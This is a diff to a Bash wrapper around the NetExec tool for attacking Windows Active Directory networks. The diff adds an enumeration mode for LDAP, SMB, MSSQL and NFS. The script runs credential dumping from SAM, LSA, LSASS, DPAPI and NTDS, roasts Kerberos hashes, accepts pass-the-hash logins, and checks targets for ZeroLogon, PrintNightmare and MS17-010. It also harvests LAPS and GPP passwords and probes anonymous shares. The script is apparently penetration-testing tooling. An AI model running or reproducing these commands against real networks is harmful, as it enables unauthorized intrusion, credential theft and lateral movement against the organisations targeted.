@@ -10,11 +10,17 @@ NC="${C}[0m"
 
 # ───────── Usage ──────────
 usage() {
-  echo -e "${YELLOW}Usage:${NC} $0 <mode> <target> -u <user> (-p <pass> | -H <hash> | --aesKey <key> --kdcHost <dc> | --use-kcache) -o <output-dir> [--local-auth]"
+  echo -e "${YELLOW}Usage:${NC} $0 <mode> [protocol] <target> [auth] -o <output-dir> [--local-auth]"
   echo ""
-  echo "  <mode>        elevated | verify | roast"
+  echo "  <mode>        elevated | verify | roast | enum"
   echo "                  elevated: Requires elevated privileges (local admin+) to extract credentials and interesting information for lateral movement"
-  echo "  <target>      Single IP or CIDR (or DC for roast mode)"
+  echo "                  enum:     Enumerate services using nxc (requires protocol)"
+  echo "  [protocol]    ldap | smb | mssql | nfs  (only for enum mode)"
+  echo "                  ldap:  LDAP & DC SMB enumeration (requires auth)"
+  echo "                  smb:   SMB enumeration (auth: authenticated checks, no auth: signing/anon/guest/vulns)"
+  echo "                  mssql: MSSQL enumeration (requires auth)"
+  echo "                  nfs:   NFS enumeration (no auth needed)"
+  echo "  <target>      Single IP or CIDR"
   echo "  -u            Username"
   echo "  -p            Password"
   echo "  -H            NTLM hash"
@@ -30,6 +36,14 @@ usage() {
 # ───────── Parse Arguments ──────────
 MODE="$1"
 shift
+
+# For enum mode, next arg is the protocol
+PROTOCOL=""
+if [[ "$MODE" == "enum" ]]; then
+  PROTOCOL="$1"
+  shift
+fi
+
 TARGET="$1"
 shift
 
@@ -37,6 +51,7 @@ LOCAL_AUTH=0
 AESKEY=""
 KDCHOST=""
 USE_KCACHE=0
+USER_SET=0
 
 # Pre-scan args for long options
 for arg in "$@"; do
@@ -58,6 +73,7 @@ while [[ $# -gt 0 ]]; do
   case "$1" in
   -u)
     USER="$2"
+    USER_SET=1
     shift 2
     ;;
   -p)
@@ -103,43 +119,68 @@ if [[ -z "$MODE" || -z "$TARGET" || -z "$OUTDIR" ]]; then
   usage
 fi
 
-if [[ $USE_KCACHE -eq 0 && -z "$USER" ]]; then
-  echo -e "${RED}[-] Username (-u) is required unless using --use-kcache${NC}"
+if [[ "$MODE" != "elevated" && "$MODE" != "verify" && "$MODE" != "roast" && "$MODE" != "enum" ]]; then
+  echo -e "${RED}[-] Mode must be one of: elevated, verify, roast, enum${NC}"
   usage
 fi
 
-if [[ "$MODE" != "elevated" && "$MODE" != "verify" && "$MODE" != "roast" ]]; then
-  echo -e "${RED}[-] Mode must be one of: elevated, verify, roast${NC}"
-  usage
+if [[ "$MODE" == "enum" ]]; then
+  if [[ "$PROTOCOL" != "ldap" && "$PROTOCOL" != "smb" && "$PROTOCOL" != "mssql" && "$PROTOCOL" != "nfs" ]]; then
+    echo -e "${RED}[-] enum protocol must be one of: ldap, smb, mssql, nfs${NC}"
+    usage
+  fi
 fi
 
-# auth validation
-if [[ $USE_KCACHE -eq 1 ]]; then
-  if [[ -n "$PASS" || -n "$HASH" || -n "$AESKEY" ]]; then
-    echo -e "${RED}[-] Cannot use --use-kcache with -p, -H, or --aesKey${NC}"
-    usage
-  fi
-elif [[ -n "$AESKEY" || -n "$KDCHOST" ]]; then
-  if [[ -z "$AESKEY" || -z "$KDCHOST" ]]; then
-    echo -e "${RED}[-] --aesKey requires --kdcHost and vice versa${NC}"
-    usage
-  fi
-  if [[ -n "$PASS" || -n "$HASH" ]]; then
-    echo -e "${RED}[-] Cannot use --aesKey with -p or -H${NC}"
-    usage
-  fi
+# Determine if auth is needed/provided
+HAS_AUTH=0
+if [[ $USE_KCACHE -eq 1 || $USER_SET -eq 1 ]]; then
+  HAS_AUTH=1
+fi
+
+# Auth requirement check (skip for enum smb without auth and enum nfs)
+if [[ "$MODE" == "enum" && "$PROTOCOL" == "nfs" ]]; then
+  : # NFS needs no auth
+elif [[ "$MODE" == "enum" && "$PROTOCOL" == "smb" && $HAS_AUTH -eq 0 ]]; then
+  : # SMB can run unauthenticated checks
 else
-  if [[ -z "$PASS" && -z "$HASH" ]]; then
-    echo -e "${RED}[-] Must specify either -p, -H, --aesKey+--kdcHost, or --use-kcache${NC}"
-    usage
-  elif [[ -n "$PASS" && -n "$HASH" ]]; then
-    echo -e "${RED}[-] Specify only one of -p or -H${NC}"
+  if [[ $USE_KCACHE -eq 0 && $USER_SET -eq 0 ]]; then
+    echo -e "${RED}[-] Username (-u) is required unless using --use-kcache${NC}"
     usage
   fi
 fi
 
+# auth validation (only when auth is provided)
+if [[ $HAS_AUTH -eq 1 ]]; then
+  if [[ $USE_KCACHE -eq 1 ]]; then
+    if [[ -n "$PASS" || -n "$HASH" || -n "$AESKEY" ]]; then
+      echo -e "${RED}[-] Cannot use --use-kcache with -p, -H, or --aesKey${NC}"
+      usage
+    fi
+  elif [[ -n "$AESKEY" || -n "$KDCHOST" ]]; then
+    if [[ -z "$AESKEY" || -z "$KDCHOST" ]]; then
+      echo -e "${RED}[-] --aesKey requires --kdcHost and vice versa${NC}"
+      usage
+    fi
+    if [[ -n "$PASS" || -n "$HASH" ]]; then
+      echo -e "${RED}[-] Cannot use --aesKey with -p or -H${NC}"
+      usage
+    fi
+  else
+    if [[ -z "$PASS" && -z "$HASH" ]]; then
+      echo -e "${RED}[-] Must specify either -p, -H, --aesKey+--kdcHost, or --use-kcache${NC}"
+      usage
+    elif [[ -n "$PASS" && -n "$HASH" ]]; then
+      echo -e "${RED}[-] Specify only one of -p or -H${NC}"
+      usage
+    fi
+  fi
+fi
+
+# ───────── Log file setup ──────────
 if [[ "$MODE" == "verify" ]]; then
   LOGFILE="$OUTDIR"/"${USER:-kcache}_${MODE}.log"
+elif [[ "$MODE" == "enum" ]]; then
+  LOGFILE="$OUTDIR"/"${TARGET}_enum_${PROTOCOL}.log"
 else
   LOGFILE="$OUTDIR"/"${TARGET}_${MODE}.log"
 fi
@@ -152,10 +193,11 @@ fi
 mkdir -p "$OUTDIR"
 touch "$LOGFILE"
 
+# ───────── Helper functions ──────────
 log() {
   local msg="$1"
   local additional_file="$2"
-  
+
   if [[ -n "$additional_file" ]]; then
     echo -e "${BLUE}[+]${NC} $msg" | tee -a "$LOGFILE" | tee -a "$additional_file"
   else
@@ -178,36 +220,48 @@ run_nxc_interesting() {
   unbuffer "$@" | tee -a "$LOGFILE" | tee -a "$INTERESTINGFILE"
 }
 
-# build base auth flags
-if [[ $USE_KCACHE -eq 1 ]]; then
-  BASE_AUTH_ARGS="--use-kcache -k"
-else
-  BASE_AUTH_ARGS="-u $USER"
-  if [[ -n "$PASS" ]]; then
-    BASE_AUTH_ARGS+=" -p $PASS"
-  elif [[ -n "$HASH" ]]; then
-    BASE_AUTH_ARGS+=" -H $HASH"
-  elif [[ -n "$AESKEY" ]]; then
-    BASE_AUTH_ARGS+=" --aesKey $AESKEY --kdcHost $KDCHOST"
-  fi
-fi
+run_enum() {
+  local outfile="$1"
+  shift
+  log "Running: $*"
+  unbuffer "$@" 2>&1 | tee -a "$LOGFILE" | tee "$OUTDIR/$outfile"
+}
 
-AUTH_ARGS="$BASE_AUTH_ARGS"
-if [[ $LOCAL_AUTH -eq 1 && $USE_KCACHE -eq 0 && -z "$AESKEY" ]]; then
-  AUTH_ARGS+=" --local-auth"
+# ───────── Build auth flags ──────────
+if [[ $HAS_AUTH -eq 1 ]]; then
+  if [[ $USE_KCACHE -eq 1 ]]; then
+    BASE_AUTH_ARGS="--use-kcache -k"
+  else
+    BASE_AUTH_ARGS="-u $USER"
+    if [[ -n "$PASS" ]]; then
+      BASE_AUTH_ARGS+=" -p $PASS"
+    elif [[ -n "$HASH" ]]; then
+      BASE_AUTH_ARGS+=" -H $HASH"
+    elif [[ -n "$AESKEY" ]]; then
+      BASE_AUTH_ARGS+=" --aesKey $AESKEY --kdcHost $KDCHOST"
+    fi
+  fi
+
+  AUTH_ARGS="$BASE_AUTH_ARGS"
+  if [[ $LOCAL_AUTH -eq 1 && $USE_KCACHE -eq 0 && -z "$AESKEY" ]]; then
+    AUTH_ARGS+=" --local-auth"
+  fi
+else
+  BASE_AUTH_ARGS=""
+  AUTH_ARGS=""
 fi
 
 # ───────── Mode Logic ──────────
 case "$MODE" in
 elevated)
   log "Starting credential and information collection…"
-  
+
   # Main credential dumping
   run_nxc_creds nxc smb "$TARGET" $AUTH_ARGS --sam
   run_nxc_creds nxc smb "$TARGET" $AUTH_ARGS -M lsassy
   run_nxc_creds nxc smb "$TARGET" $AUTH_ARGS --lsa
   run_nxc_creds nxc smb "$TARGET" $AUTH_ARGS --dpapi
-  
+
   run_nxc_creds nxc smb "$TARGET" $AUTH_ARGS -M wifi
   run_nxc_creds nxc smb "$TARGET" $AUTH_ARGS -M winscp
   run_nxc_creds nxc smb "$TARGET" $AUTH_ARGS -M rdcman
@@ -215,7 +269,7 @@ elevated)
   run_nxc_creds nxc smb "$TARGET" $AUTH_ARGS -M ntdsutil
   log "Running: nxc smb $TARGET $AUTH_ARGS --ntds" "$CREDFILE"
   script -efqa "$LOGFILE" -c "printf 'Y\n' | nxc smb $TARGET $AUTH_ARGS --ntds" | tee -a "$CREDFILE"
-  
+
   # Interesting information commands (in order from nxc smb -L)
   run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M bitlocker
   run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M eventlog_creds
@@ -294,5 +348,141 @@ roast)
   echo -e "${GREEN}[✓] Kerberoast hashes:    $OUTDIR/kerberoast.hash"
   echo -e "${GREEN}[✓] ASREProast hashes:    $OUTDIR/asrep.hash"
   echo -e "${GREEN}[✓] Timeroast hashes:     $OUTDIR/timeroast.hash"
+  ;;
+
+enum)
+  case "$PROTOCOL" in
+  ldap)
+    log "Starting LDAP & DC SMB enumeration…"
+
+    # ── nxc ldap: Retrieve useful information on the domain ──
+    run_enum "atm_ldap_find_delegation.txt"          nxc ldap "$TARGET" $BASE_AUTH_ARGS --find-delegation
+    run_enum "atm_ldap_trusted_for_delegation.txt"   nxc ldap "$TARGET" $BASE_AUTH_ARGS --trusted-for-delegation
+    run_enum "atm_ldap_admin_count.txt"              nxc ldap "$TARGET" $BASE_AUTH_ARGS --admin-count
+    run_enum "atm_ldap_groups_backup_operators.txt"  nxc ldap "$TARGET" $BASE_AUTH_ARGS --groups "Backup Operators"
+    run_enum "atm_ldap_groups_domain_admins.txt"     nxc ldap "$TARGET" $BASE_AUTH_ARGS --groups "Domain Admins"
+    run_enum "atm_ldap_dc_list.txt"                  nxc ldap "$TARGET" $BASE_AUTH_ARGS --dc-list
+    run_enum "atm_ldap_get_sid.txt"                  nxc ldap "$TARGET" $BASE_AUTH_ARGS --get-sid
+    run_enum "atm_ldap_pso.txt"                      nxc ldap "$TARGET" $BASE_AUTH_ARGS --pso
+
+    # ── nxc ldap: Low Privilege Modules > Enumeration ──
+    run_enum "atm_ldap_adcs.txt"                     nxc ldap "$TARGET" $BASE_AUTH_ARGS -M adcs
+    run_enum "atm_ldap_badsuccessor.txt"             nxc ldap "$TARGET" $BASE_AUTH_ARGS -M badsuccessor
+    run_enum "atm_ldap_certipy_find.txt"             nxc ldap "$TARGET" $BASE_AUTH_ARGS -M certipy-find -o ENABLED=true TEXT=true
+    run_enum "atm_ldap_dns_nonsecure.txt"            nxc ldap "$TARGET" $BASE_AUTH_ARGS -M dns-nonsecure
+    run_enum "atm_ldap_dump_computers.txt"           nxc ldap "$TARGET" $BASE_AUTH_ARGS -M dump-computers
+    run_enum "atm_ldap_entra_id.txt"                 nxc ldap "$TARGET" $BASE_AUTH_ARGS -M entra-id
+    run_enum "atm_ldap_get_network.txt"              nxc ldap "$TARGET" $BASE_AUTH_ARGS -M get-network -o ALL=true
+    run_enum "atm_ldap_obsolete.txt"                 nxc ldap "$TARGET" $BASE_AUTH_ARGS -M obsolete
+    run_enum "atm_ldap_pso_module.txt"               nxc ldap "$TARGET" $BASE_AUTH_ARGS -M pso
+    run_enum "atm_ldap_subnets.txt"                  nxc ldap "$TARGET" $BASE_AUTH_ARGS -M subnets
+
+    # ── nxc ldap: Low Privilege Modules > Credential Dumping ──
+    run_enum "atm_ldap_get_desc_users.txt"           nxc ldap "$TARGET" $BASE_AUTH_ARGS -M get-desc-users
+    run_enum "atm_ldap_get_info_users.txt"           nxc ldap "$TARGET" $BASE_AUTH_ARGS -M get-info-users
+    run_enum "atm_ldap_get_unixUserPassword.txt"     nxc ldap "$TARGET" $BASE_AUTH_ARGS -M get-unixUserPassword
+    run_enum "atm_ldap_get_userPassword.txt"         nxc ldap "$TARGET" $BASE_AUTH_ARGS -M get-userPassword
+    run_enum "atm_ldap_laps.txt"                     nxc ldap "$TARGET" $BASE_AUTH_ARGS -M laps
+
+    # ── nxc ldap: Low Privilege Modules > Privilege Escalation ──
+    run_enum "atm_ldap_pre2k.txt"                    nxc ldap "$TARGET" $BASE_AUTH_ARGS -M pre2k
+
+    # ── nxc smb (DC): Mapping/Enumeration ──
+    run_enum "atm_dc_smb_shares.txt"                 nxc smb "$TARGET" $AUTH_ARGS --shares
+    run_enum "atm_dc_smb_users.txt"                  nxc smb "$TARGET" $AUTH_ARGS --users
+    run_enum "atm_dc_smb_local_groups.txt"           nxc smb "$TARGET" $AUTH_ARGS --local-groups
+    run_enum "atm_dc_smb_pass_pol.txt"               nxc smb "$TARGET" $AUTH_ARGS --pass-pol
+
+    # ── nxc smb (DC): Low Privilege Modules > Credential Dumping ──
+    run_enum "atm_dc_smb_gpp_autologin.txt"          nxc smb "$TARGET" $AUTH_ARGS -M gpp_autologin
+    run_enum "atm_dc_smb_gpp_password.txt"           nxc smb "$TARGET" $AUTH_ARGS -M gpp_password
+
+    echo -e "${GREEN}[✓] Logfile output:       ${LOGFILE}"
+    ;;
+
+  smb)
+    if [[ $HAS_AUTH -eq 1 ]]; then
+      log "Starting authenticated SMB enumeration…"
+
+      # ── nxc smb: Mapping/Enumeration ──
+      run_enum "atm_smb_shares.txt"              nxc smb "$TARGET" $AUTH_ARGS --shares
+      run_enum "atm_smb_shares_rw.txt"           nxc smb "$TARGET" $AUTH_ARGS --filter-shares "read,write"
+      run_enum "atm_smb_shares_r.txt"            nxc smb "$TARGET" $AUTH_ARGS --filter-shares "read"
+      run_enum "atm_smb_shares_w.txt"            nxc smb "$TARGET" $AUTH_ARGS --filter-shares "write"
+      run_enum "atm_smb_disks.txt"               nxc smb "$TARGET" $AUTH_ARGS --disks
+      run_enum "atm_smb_users.txt"               nxc smb "$TARGET" $AUTH_ARGS --users
+      run_enum "atm_smb_local_groups.txt"        nxc smb "$TARGET" $AUTH_ARGS --local-groups
+      run_enum "atm_smb_rid_brute.txt"           nxc smb "$TARGET" $AUTH_ARGS --rid-brute
+      run_enum "atm_smb_reg_sessions.txt"        nxc smb "$TARGET" $AUTH_ARGS --reg-sessions
+      run_enum "atm_smb_tasklist.txt"            nxc smb "$TARGET" $AUTH_ARGS --tasklist
+
+      # ── nxc smb: Low Privilege Modules > Enumeration ──
+      run_enum "atm_smb_enum_av.txt"             nxc smb "$TARGET" $AUTH_ARGS -M enum_av
+      run_enum "atm_smb_ioxidresolver.txt"       nxc smb "$TARGET" $AUTH_ARGS -M ioxidresolver
+      run_enum "atm_smb_nopac.txt"               nxc smb "$TARGET" $AUTH_ARGS -M nopac
+      run_enum "atm_smb_ntlm_reflection.txt"     nxc smb "$TARGET" $AUTH_ARGS -M ntlm_reflection
+
+      # ── nxc smb: Low Privilege Modules > Credential Dumping ──
+      run_enum "atm_smb_spider_plus.txt"         nxc smb "$TARGET" $AUTH_ARGS -M spider_plus
+
+      # ── nxc smb: Low Privilege Modules > Privilege Escalation ──
+      run_enum "atm_smb_coerce_plus.txt"         nxc smb "$TARGET" $AUTH_ARGS -M coerce_plus
+
+      # ── nxc smb: High Privilege Modules > Credential Dumping ──
+      run_enum "atm_smb_reg_winlogon.txt"        nxc smb "$TARGET" $AUTH_ARGS -M reg-winlogon
+
+    else
+      log "Starting unauthenticated SMB enumeration…"
+
+      # ── nxc smb: SMB signing check ──
+      run_enum "atm_smb_signing.txt"             nxc smb "$TARGET" --gen-relay-list "$OUTDIR/atm_smb_relay_list.txt"
+
+      # ── nxc smb: Anonymous/Guest access ──
+      run_enum "atm_smb_anonlogin.txt"           nxc smb "$TARGET" -u '' -p '' --shares
+      run_enum "atm_smb_guestlogin.txt"          nxc smb "$TARGET" -u 'a' -p '' --shares
+
+      # ── nxc smb: Low Privilege Modules > Enumeration (no auth) ──
+      run_enum "atm_smb_ms17-010.txt"            nxc smb "$TARGET" -u '' -p '' -M ms17-010
+      run_enum "atm_smb_nopac.txt"               nxc smb "$TARGET" -u '' -p '' -M nopac
+      run_enum "atm_smb_ntlm_reflection.txt"     nxc smb "$TARGET" -u '' -p '' -M ntlm_reflection
+      run_enum "atm_smb_printnightmare.txt"      nxc smb "$TARGET" -u '' -p '' -M printnightmare
+      run_enum "atm_smb_remove-mic.txt"          nxc smb "$TARGET" -u '' -p '' -M remove-mic
+      run_enum "atm_smb_smbghost.txt"            nxc smb "$TARGET" -u '' -p '' -M smbghost
+      run_enum "atm_smb_zerologon.txt"           nxc smb "$TARGET" -u '' -p '' -M zerologon
+
+      # ── nxc smb: Low Privilege Modules > Privilege Escalation (no auth) ──
+      run_enum "atm_smb_coerce_plus.txt"         nxc smb "$TARGET" -u '' -p '' -M coerce_plus
+    fi
+
+    echo -e "${GREEN}[✓] Logfile output:       ${LOGFILE}"
+    ;;
+
+  mssql)
+    log "Starting MSSQL enumeration…"
+
+    # ── nxc mssql: Mapping/Enumeration ──
+    run_enum "atm_mssql_rid_brute.txt"           nxc mssql "$TARGET" $AUTH_ARGS --rid-brute
+
+    # ── nxc mssql: Low Privilege Modules > Enumeration ──
+    run_enum "atm_mssql_enum_impersonate.txt"    nxc mssql "$TARGET" $AUTH_ARGS -M enum_impersonate
+    run_enum "atm_mssql_enum_links.txt"          nxc mssql "$TARGET" $AUTH_ARGS -M enum_links
+    run_enum "atm_mssql_enum_logins.txt"         nxc mssql "$TARGET" $AUTH_ARGS -M enum_logins
+
+    # ── nxc mssql: Low Privilege Modules > Privilege Escalation ──
+    run_enum "atm_mssql_mssql_priv.txt"          nxc mssql "$TARGET" $AUTH_ARGS -M mssql_priv
+
+    echo -e "${GREEN}[✓] Logfile output:       ${LOGFILE}"
+    ;;
+
+  nfs)
+    log "Starting NFS enumeration…"
+
+    run_enum "atm_nfs_shares.txt"                nxc nfs "$TARGET" --shares
+    run_enum "atm_nfs_enum_shares.txt"           nxc nfs "$TARGET" --enum-shares
+    run_enum "atm_nfs_root_escape.txt"           nxc nfs "$TARGET" --ls '/'
+
+    echo -e "${GREEN}[✓] Logfile output:       ${LOGFILE}"
+    ;;
+  esac
   ;;
 esac
